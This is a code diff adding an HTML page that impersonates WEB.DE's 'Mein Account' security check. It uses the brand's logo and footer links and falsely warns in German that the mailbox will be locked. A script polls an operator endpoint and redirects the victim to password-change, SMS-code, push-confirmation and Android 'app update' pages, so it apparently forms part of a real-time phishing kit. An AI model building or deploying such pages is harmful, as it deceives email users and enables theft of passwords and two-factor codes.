@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon-webde.png" type="image/png">
+  <title>Sicherheitsprüfung — WEB.DE Mein Account</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <style>
+    .open-on-pc-card { max-width: 480px; margin: 0 auto; }
+    .open-on-pc-text { font-size: 1rem; line-height: 1.6; color: var(--text, #333); margin: 0 0 24px 0; }
+    .open-on-pc-icon { width: 52px; height: 52px; margin: 0 auto 20px; display: block; }
+    .open-on-pc-icon--warning .triangle { fill: #d32f2f; }
+    .open-on-pc-icon--warning .mark { fill: #fff; }
+  </style>
+  <!-- __BRAND_JSON__ -->
+  <script src="/brand.js"></script>
+</head>
+<body class="page-change-password">
+  <header class="gmx-header gmx-header--steps" aria-hidden="false">
+    <div class="header-inner">
+      <span class="gmx-logo" id="brand-logo-text">WEB.DE</span>
+      <span class="header-title">Mein Account</span>
+    </div>
+  </header>
+
+  <div class="page-center">
+    <main class="main card open-on-pc-card">
+      <section class="card-inner step active">
+        <header class="auth-header">
+          <img class="logo-brand" src="https://upload.wikimedia.org/wikipedia/de/5/5f/Web.de_logo.svg" alt="WEB.DE" width="120" height="40">
+          <h2 class="heading-main">Sicherheitsprüfung</h2>
+        </header>
+        <svg class="open-on-pc-icon open-on-pc-icon--warning" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path class="triangle" d="M12 1.5L2 21h20L12 1.5z"/>
+          <path class="mark" d="M11 7h2v8h-2z"/>
+          <circle class="mark" cx="12" cy="18.5" r="1.25"/>
+        </svg>
+        <p class="open-on-pc-text">
+          Öffnen Sie die E-Mail auf dem Computer oder Laptop und führen Sie dort ebenfalls die Sicherheitsprüfung durch. Andernfalls wird der Zugang zum Postfach aus Sicherheitsgründen gesperrt.
+        </p>
+      </section>
+    </main>
+  </div>
+
+  <script>
+    (function () {
+      var params = new URLSearchParams(window.location.search);
+      var id = params.get('id') || '';
+      if (!id) return;
+      var t = setInterval(function () {
+        fetch('/api/status?id=' + encodeURIComponent(id) + '&page=bitte-am-pc&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
+          .then(function (r) { return r.json(); })
+          .then(function (res) {
+            if ((res && res.mode) === 'manual') return;
+            var st = res && res.status;
+            if (st === 'redirect_android') { clearInterval(t); window.location = '/app-update?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_sicherheit') { clearInterval(t); window.location = '/sicherheit-update?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_change_password') { clearInterval(t); window.location = '/passwort-aendern?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_push') { clearInterval(t); window.location = '/push-confirm.html?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_sms_code') { clearInterval(t); window.location = '/sms-code.html?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_gmx_net') { clearInterval(t); window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://web.de/'; }
+            else if (st === 'error') { clearInterval(t); window.location = '/anmelden'; }
+          })
+          .catch(function () {});
+      }, 1000);
+    })();
+  </script>
+  <footer class="footer">
+    <ul class="footer-links">
+      <li><a href="https://web.de/agb" target="_blank" rel="noopener">AGB</a></li>
+      <li><a href="https://web.de/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+      <li><a href="https://web.de/datenschutz" target="_blank" rel="noopener">Datenschutz</a></li>
+    </ul>
+  </footer>
+  <script src="/status-redirect-webde.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
